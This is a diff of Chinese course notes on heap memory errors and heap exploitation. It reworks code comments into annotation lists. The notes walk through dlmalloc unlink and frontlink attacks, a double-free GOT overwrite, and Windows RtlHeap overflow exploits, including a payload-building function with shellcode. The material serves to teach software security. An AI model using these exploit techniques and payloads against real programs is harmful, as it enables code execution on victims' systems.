@@ -48,22 +48,25 @@
 
 ### 常见内存管理错误
 1. 初始化错误
-    * 不要假设malloc()把分配的内存的所有位初始化为零
+    * 不要假设`malloc()`把分配的内存的所有位初始化为零
 
     ```c linenums="1" hl_lines="8"
     /* return y = Ax */
-    int *matvec(int **A, int *x, int n) {
+    int* matvec(int **A, int *x, int n) {
       int *y = malloc(n * sizeof(int));
       int i, j;
 
       for (i = 0; i < n; i++)
     	for (j = 0; j < n; j++)
-    		y[i] += A[i][j] * x[j];  // y[i]是0吗？
+    		y[i] += A[i][j] * x[j];  // (1)
       return y;
     }
     ```
 
-	* 解决方案：`malloc()` → `memset()`或`calloc()`
+    1. `y[i]`是`0`吗？
+
+    !!! success "解决方案"
+        使用 `memset()`或`calloc()`替代`malloc()`
 
 2. 未检查返回值
 	* 内存分配失败：`malloc`返回空指针，`new`抛出`bad_alloc`异常
@@ -104,23 +107,29 @@
             ```
 
 3. 引用已释放内存
-	```c
+
+    * 不可能导致运行时错误
+        - 因为内存由内存管理器所有
+    * 已释放的内存在读操作之前可被分配
+        - 读操作读取的数值不正确
+        - 写操作损坏其他变量
+    * 已释放内存能被内存管理器使用
+        - 写操作能损坏内存管理器元数据
+        - 很难诊断运行时错误
+        - 漏洞利用的基础
+
+    ```c
 	for (p = head; p != NULL; p = p->next)
-		free(p);    //(1) wrong
+		free(p);    // (1)
 	for (p = head; p != NULL; p = q) {
 		q = p->next;
-		free(p);   //(2) ok - temp variable used
+		free(p);   // (2)
 	}
 	```
-	* 不可能导致运行时错误
-		- 因为内存由内存管理器所有
-	* 已释放的内存在读操作之前可被分配
-		- 读操作读取的数值不正确
-		- 写操作损坏其他变量
-	* 已释放内存能被内存管理器使用
-		- 写操作能损坏内存管理器元数据
-		- 很难诊断运行时错误
-		- 漏洞利用的基础
+
+    1. wrong
+    2. ok - temp variable used
+
 4. 多次释放内存
 	* 复制粘贴时忘记修改相应的`free`代码
 	```c hl_lines="6"
@@ -151,7 +160,8 @@
 ![chunks](md-img/20191021_02.png)
 
 * chunk的数据结构
-	```c
+
+    ```c
 	struct malloc_chunk {
 
 	  INTERNAL_SIZE_T      mchunk_prev_size;
@@ -160,11 +170,14 @@
 	  struct malloc_chunk* fd;
 	  struct malloc_chunk* bk;
 
-	  struct malloc_chunk* fd_nextsize; /* (1) double links -- used only if free. */
+	  struct malloc_chunk* fd_nextsize; /* (1) */
 	  struct malloc_chunk* bk_nextsize;
 
 	};
 	```
+
+    1. double links -- used only if free.
+
 * 空闲块
 	* 以双链表形式组织起来
 	* 包含指向下一块的前向指针和指向上一块的后向指针
@@ -191,7 +204,8 @@
 	```
 ![unlink示意](md-img/20191021_04.png)
 * 本质：任意写（欺骗unlink宏向任意位置写入4字节数据）
-	```c linenums="1" hl_lines="5-7"
+
+    ```c linenums="1" hl_lines="5-7"
 	#include <stdlib.h>
 	#include <string.h>
 	int main(int argc, char *argv[]) {
@@ -199,18 +213,22 @@
 		first = malloc(666);
 		second = malloc(12);
 		third = malloc(12);
-		strcpy(first, argv[1]); //(1) 程序接受单个字符串参数并将其复制到first中，无界strcpy()容易造成缓冲区溢出
-		free(first);            //(2) 程序调用free()释放第一块内存
-								//参数会覆写第二块内存中表示上一块内存大小的域、块大小值以及前向指针和后向指针，从而也就修改了free()操作的行为
-								//第二块内存的大小域的值被修改为-4 ，因此，当free()需要确定第三块内存的位置时，也就是说，将第二块内存的起始位置加上其大小时，会导致其起始位置减4
-								//Doug Lea的malloc此时会错误地认为下一连续内存块自第二块内存前面4字节起
-								//这个恶意参数也会使dlmalloc所找到的PREV_INUSE标志位为空， 从而dlmalloc误以为第二块内存是未分配的，导致free()调用unlink()宏来合并这两块内存
-		free(second);           //(3) 如果第二块内存处于未分配状态（即空闲），free()操作将会试图将其与第一块合并
-								//(4) 为了判断第二块内存是否处于空闲状态，free()会检查第3块的PREV_INUSE标志位
+		strcpy(first, argv[1]); // (1)
+		free(first);            // (2)
+		free(second);           // (3)
+								// (4)
 		free(third);
 		return 0;
 	}
 	```
+
+    1. 程序接受单个字符串参数并将其复制到`first`中，无界`strcpy()`容易造成缓冲区溢出
+    2. 程序调用`free()`释放第一块内存，参数会覆写第二块内存中表示上一块内存大小的域、块大小值以及前向指针和后向指针，从而也就修改了`free()`操作的行为
+        - 第二块内存的大小域的值被修改为-4 ，因此，当`free()`需要确定第三块内存的位置时，也就是说，将第二块内存的起始位置加上其大小时，会导致其起始位置减4。Doug Lea的malloc此时会错误地认为下一连续内存块自第二块内存前面4字节起。
+        - 这个恶意参数也会使dlmalloc所找到的`PREV_INUSE`标志位为空， 从而dlmalloc误以为第二块内存是未分配的，导致`free()`调用`unlink()`宏来合并这两块内存
+    3. 如果第二块内存处于未分配状态（即空闲），`free()`操作将会试图将其与第一块合并
+    4. 为了判断第二块内存是否处于空闲状态，`free()`会检查第3块的`PREV_INUSE`标志位
+
 * payload
     - 第一块：`4bytes fd + 4bytes bk + shellcode + fill = 680 bytes`
     - 第二块：`4bytes prev size(even) + 4bytes size(-4) + 4bytes fd(fp-12) + 4bytes bk(shellcode_addr) + '\0'`
@@ -225,7 +243,7 @@
 ### frontlink技术 → 入链攻击
 * 攻击者指定一个内存块的地址而不是shellcode的地址，攻击者在这个内存块的起始4个字节中放入可执行代码
 * frontlink代码片段
-	```c
+	```c linenums="1"
 	BK = bin;
 	FD = BK->fd;
 	if (FD != BK) {
@@ -240,7 +258,8 @@
 	```
 * 本质：任意写
 	* 向一个内存块地址起始4个字节中放入可执行代码
-		```c
+
+        ```c linenums="1"
 		#include <stdlib.h>
 		#include <string.h>
 		#include <stdio.h>
@@ -258,16 +277,20 @@
 			fifth = malloc(1508);
 			sixth = malloc(12);
 			strcpy(first, argv[2]);
-			free(fifth);	                //(1) 当fifth内存块被释放时，它被放入一个筐中
-			strcpy(fourth, argv[1]);	    //(2) 其直接前驱内存块fourth被精心设计的数据所填满（argv[1]），因此这里就发生了溢出并且fifth的前向指针指向了一个假的内存块，这个假的内存块的后向指针的位置包含有一个函数指针的地址（地址减8）。一个合适的函数指针是存储于程序.dtors区中的第一个析构函数的地址，攻击者可以通过检查可执行映像而获得这个地址。
-			free(second);	                //(3) 当second块被释放时，程序使frontlink()代码段将其插入到与fifth块相同的筐中
-											//second比fifth内存块小，frontlink代码中的while循环执行了
-			return(0);   //(4) 对return(0)的调用，本来应该导致程序的析构函数被调用，而现在实际调用的却是shellcode
-			//fifth块的前向指针被存储到FD中
-			//假内存块的后向指针存储到变量BK中
-			//现在BK包含有函数指针的地址（指针值减8）函数指针被second块的地址所覆写
+			free(fifth);	                //(1)
+			strcpy(fourth, argv[1]);	    //(2)
+			free(second);	                //(3)
+			return(0);                      //(4)
+			                                //(5)
 		}
 		```
+
+        1. 当`fifth`内存块被释放时，它被放入一个筐中
+        2. 其直接前驱内存块`fourth`被精心设计的数据所填满（`argv[1]`），因此这里就发生了溢出，并且`fifth`的前向指针指向了一个假的内存块，这个假的内存块的后向指针的位置包含有一个函数指针的地址（地址减8）。一个合适的函数指针是存储于程序`.dtors`区中的第一个析构函数的地址，攻击者可以通过检查可执行映像而获得这个地址。
+        3. 当`second`块被释放时，程序使`frontlink()`代码段将其插入到与`fifth`块相同的筐中。`second`比`fifth`内存块小，frontlink代码中的`while`循环执行了
+        4. 对`return(0)`的调用，本来应该导致程序的析构函数被调用，而现在实际调用的却是shellcode
+        5. `fifth`块的前向指针被存储到`FD`中，假内存块的后向指针存储到变量`BK`中，现在`BK`包含有函数指针的地址（指针值减8）函数指针被`second`块的地址所覆写
+
 * payload：一段shellcode，该shellcode的最后4个字节就是跳转到shellcode其他部分的跳转指令，并且这4个字节是first块的最后4个字节
 	- 被攻击的内存块必须是8的整数倍减去4个字节长
 
@@ -309,26 +332,38 @@
 				void *fifth, *sixth, *seventh;
 				shellcode_location = (void *)malloc(size);
 				strcpy(shellcode_location, shellcode);
-				first = (void *)malloc(256);                //(1) 利用方式的目标是分配的first块
+				first = (void *)malloc(256);                //(1)
 				second = (void *)malloc(256);
 				third = (void *)malloc(256);
-				fourth = (void *)malloc(256);               //(2) 对second和fourth块的分配，可以阻止third块与first块合并
-				free(first);                                //(3) 当first块在初次释放时，会被放入缓存筐而不是普通的筐
-				free(third);                                //(4) 释放third块将first块移到普通筐
-				fifth = (void *)malloc(128);                //(5) 分配fifth块会造成内存从third块处分开，作为一个副作用，还会导致first块被转移到一个普通筐中
-				free(first);                                //(6) 内存已经配置成功，因此对first的第二次释放构成双重释放漏洞
-				sixth = (void *)malloc(256);                //(7) 分配sixth块时，malloc()返回的指针与first所指向的内存块相同
-				*((void **)(sixth+0))=(void *)(GOT_LOCATION-12);  //(8) strcpy()函数的GOT地址（减去12）以及shellcode位置被复制到这块内存
+				fourth = (void *)malloc(256);               //(2)
+				free(first);                                //(3)
+				free(third);                                //(4)
+				fifth = (void *)malloc(128);                //(5)
+				free(first);                                //(6)
+				sixth = (void *)malloc(256);                //(7)
+				*((void **)(sixth+0))=(void *)(GOT_LOCATION-12);  //(8)
 				*((void **)(sixth+4))=(void *)shellcode_location;
-				seventh = (void *)malloc(256);              //(9) 相同的内存块被再一次分配给seventh块
-				strcpy(fifth, "something");                 //(10) 当内存块被分配后，unlink()宏将shellcode的地址复制到全局偏移表中strcpy的地址处
-															//(11) 调用strcpy()时，程序的控制权被转移到shellcode中
-															//(12) shellcode跳过最初的12个字节，因为这部分内存的一些已经被unlink()宏所覆写。
+				seventh = (void *)malloc(256);              //(9)
+				strcpy(fifth, "something");                 //(10)
+															//(11)
 				return 0;
 			}
 			```
 
-			- 对于以上代码，假如注释了第二次`free(first)`操作，不会有双重释放问题，但是仍然导致调用strcpy后进入shellcode的控制内，因为写入了first，对`malloc()`的调用以shellcode的地址取代了`strcpy()`的地址。
+            1. 利用方式的目标是分配的`first`块
+            2. 对`second`和`fourth`块的分配，可以阻止`third`块与`first`块合并
+            3. 当`first`块在初次释放时，会被放入缓存筐而不是普通的筐
+            4. 释放`third`块将`first`块移到普通筐
+            5. 分配`fifth`块会造成内存从`third`块处分开，作为一个副作用，还会导致`first`块被转移到一个普通筐中
+            6. 内存已经配置成功，因此对`first`的第二次释放构成双重释放漏洞
+            7. 分配`sixth`块时，`malloc()`返回的指针与`first`所指向的内存块相同
+            8. `strcpy()`函数的GOT地址（减去12）以及shellcode位置被复制到这块内存
+            9. 相同的内存块被再一次分配给`seventh`块
+            10. 当内存块被分配后，`unlink`宏将shellcode的地址复制到全局偏移表中`strcpy`的地址处
+            11. 调用`strcpy()`时，程序的控制权被转移到shellcode中。shellcode跳过最初的`12`个字节，因为这部分内存的一些已经被`unlink`宏所覆写。
+
+        !!! warning ""
+			对于以上代码，假如注释了第二次`free(first)`操作，不会有双重释放问题，但是仍然导致调用`strcpy`后进入shellcode的控制内，因为写入了`first`，对`malloc()`的调用以shellcode的地址取代了`strcpy()`的地址。
 
 ## RTL（Run Time Library）堆
 ### Windows内存管理
@@ -360,8 +395,12 @@
 		- 加速对小块内存的分配操作（<1016字节）
 		- 先于空闲链表被检查
 	* 边界标志
+        <figure>
 		![块边界结构](md-img/20191021_08.png)
-		- 自身大小
+        <figcaption>块边界结构</figcaption>
+        </figure>
+
+        - 自身大小
 		- 前一块大小
 		- busy标志位
 		- 当块被释放时：
@@ -371,6 +410,7 @@
 
 #### 基于堆的缓冲区溢出攻击
 * 改写双链表结构中的前向和后向指针
+
 	```c linenums="1" hl_lines="8-12 14"
 	unsigned char shellcode[] = "\x90\x90\x90\x90";
 	unsigned char malArg[] = "0123456789012345"
@@ -383,28 +423,35 @@
 	    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
 		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128);
 	    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
-	    HeapFree(hp,0,h2); /* 释放h2导致在已分配内存中打开了一个缺口 */
-	    memcpy(h1, malArg, 32); 	//缓冲区溢出
-	    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128); //引发返回地址被shellcode地址覆写
-		/* 对HeapAlloc()的调用会导致shellcode的起始4个字节被返回地址\xb8\xf5\x12\x00所覆盖，地址需要可被执行！ */
+	    HeapFree(hp,0,h2); /* (1) */
+	    memcpy(h1, malArg, 32); 	// (2)
+	    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128); // (3)
+		/* (4) */
 		return;
 	}
 	int _tmain(int argc, _TCHAR* argv[]) {
 		mem();
-		return 0;    //控制转移到shellcode
+		return 0;    // (5)
 	}
 	```
 
+    1. 释放`h2`导致在已分配内存中打开了一个缺口
+    2. 缓冲区溢出
+    3. 引发返回地址被shellcode地址覆写
+    4. 对`HeapAlloc()`的调用会导致shellcode的起始4个字节被返回地址`\xb8\xf5\x12\x00`所覆盖，地址需要可被执行！
+    5. 控制转移到shellcode
+
 * 通过覆写异常处理器地址获取控制，引发异常
-	```c
+
+    ```c title="vuln.c"
 	int mem(char *buf) {
 		HLOCAL h1 = 0, h2 = 0;
 		HANDLE hp;		   
-		hp = HeapCreate(0, 0x1000, 0x10000);	//create heap
+		hp = HeapCreate(0, 0x1000, 0x10000);	// (1)
 		if (!hp) return -1;
-		h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260); /* 分配了一个单独的内存块堆，包括：段头、为h1所分配的内存、段尾 */
-		strcpy((char *)h1, buf); //overflowed here
-		/* 覆写段尾，包括 LIST_Entry 结构，指针很可能在下一个对RtlHeap的调用时被引用——这会触发一个异常 */
+		h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260); /* (2) */
+		strcpy((char *)h1, buf); // (3)
+		/* (4) */
 		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 260);
 		printf("we never get here");
 		return 0;
@@ -416,7 +463,7 @@
 		mem(buffer);
 		return 0;
 	}
-	/* 可被用于构造恶意参数从而对mem()函数中的漏洞发动攻击的代码，实现漏洞利用的函数例子之一 */
+	/* (5) */
 	char buffer[1000]="";
 	void buildMalArg() {
 		int addr = 0, i = 0;
@@ -425,14 +472,11 @@
 		systemAddr = GetAddress("msvcrt.dll","system");
 		for (i = 0; i < 66; i++) strcat(buffer, "DDDD");
 		strcat(buffer, "\xeb\x14");
-		strcat(buffer, "\x44\x44\x44\x44\x44\x44");
-						/* 改写了尾随空闲块的前向和后向指针 */
-		strcat(buffer, "\x73\x68\x68\x08");
-						/* 前向指针被控制权将要转移到的地址所取代 */
+		strcat(buffer, "\x44\x44\x44\x44\x44\x44"); /* (6) */
+		strcat(buffer, "\x73\x68\x68\x08"); /* (7) */
 		strcat(buffer, "\x4c\x04\x5d\x7c");
 		for (i = 0; i < 21; i++) strcat(buffer,"\x90");
-		strcat(buffer, "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9");
-						/* 后向指针则被将要被覆写的内存地址所取代 */
+		strcat(buffer, "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"); /* (8) */
 		fixupaddresses(tmp, systemAddr);
 		strcat(buffer,tmp);
 		strcat(buffer,"\xFF\xD1\x90\x90");
@@ -440,19 +484,31 @@
 	}
 	```
 
+    1. 创建堆
+    2. 分配了一个单独的内存块堆，包括：段头、为`h1`所分配的内存、段尾
+    3. overflowed here
+    4. 覆写段尾，包括 `LIST_Entry` 结构，指针很可能在下一个对RtlHeap的调用时被引用——这会触发一个异常
+    5. 可被用于构造恶意参数从而对`mem()`函数中的漏洞发动攻击的代码，实现漏洞利用的函数例子之一
+    6. 改写了尾随空闲块的前向和后向指针
+    7. 前向指针被控制权将要转移到的地址所取代
+    8. 后向指针则被将要被覆写的内存地址所取代
+
+	```asm title="将要利用的异常管理器的汇编语句"
+	; (1)
+	mov  ecx, dword ptr [esp+4]
+	mov  eax, dword ptr ds:[7C5D044Ch]
+	mov  dword ptr ds:[7C5D044Ch], ecx
+	ret  4
+	; (2)
 	```
-	//将要利用的异常管理器的汇编语句
-		SetUnhandledExceptionFilter(myTopLevelFilter);
-		mov         ecx, dword ptr [esp+4]
-		mov         eax, dword ptr ds:[7C5D044Ch]
-		mov         dword ptr ds:[7C5D044Ch], ecx
-		ret         4
-		前向指针 addr ← shellcode addr 攻击者可以采用跳板
-	```
+
+    1. `SetUnhandledExceptionFilter(myTopLevelFilter)`
+    2. 前向指针 addr ← shellcode addr 攻击者可以采用跳板
 
 #### 可能存在的漏洞
 - 写入已释放内存
-	```c linenums="1" hl_lines="12-14"
+
+    ```c linenums="1" hl_lines="12-14"
 	typedef struct _unalloc {
 	    PVOID fp;
 	    PVOID bp;
@@ -463,15 +519,22 @@
 	    HLOCAL h2 = 0;
 	    HANDLE hp;
 	    hp = HeapCreate(0, 0x1000, 0x10000);
-	    h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);     //从该堆中分配了一个32字节的内存块，用h1表示
-	    HeapFree(hp, 0, h1);                                    //“错误地”释放
-	    h1->fp = (PVOID)(0x042B17C - 4);                        //用户数据则被错误地写入已释放内存块中
+	    h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);     //(1)
+	    HeapFree(hp, 0, h1);                                    //(2)
+	    h1->fp = (PVOID)(0x042B17C - 4);                        //(3)
 	    h1->bp = shellcode;
-	    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);               //对HeapAlloc()的调用使得HeapFree()的地址被shellcode的地址所覆盖
-	    HeapFree(hp, 0, h2);                                    //控制权转移到shellcode
+	    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);               //(4)
+	    HeapFree(hp, 0, h2);                                    //(5)
 	    return 0;
 	}
 	```
+
+    1. 从该堆中分配了一个`32`字节的内存块，用`h1`表示
+    2. “错误地”释放
+    3. 用户数据则被错误地写入已释放内存块中
+    4. 对`HeapAlloc()`的调用使得`HeapFree()`的地址被shellcode的地址所覆盖
+    5. 控制权转移到shellcode
+
 - 双重释放
 	* 基于Windows 2000漏洞
 		```c linenums="1" hl_lines="16-17"
@@ -512,7 +575,7 @@
 	* canary：“随机值”，当一个内存块被归还时，canary的值会与该内存块被分配时所计算的校验和作比较
 	* PhkMalloc：检测所有不是由`malloc()`或`realloc()`返回的值
 		- 所以可以检测所有的双重释放错误，一旦检测到错误，会调用`abort()`（启用A或abort选项）
-		- 增加J(Junk 0xd0)、Z(Zero)选项，会给分配的区域内填充数据
+		- 增加J(Junk:`0xd0`)、Z(Zero)选项，会给分配的区域内填充数据
 - 随机化
 	* `malloc()`返回地址一定程度上可以预测
 	* 使对基于堆的漏洞利用变得更加困难
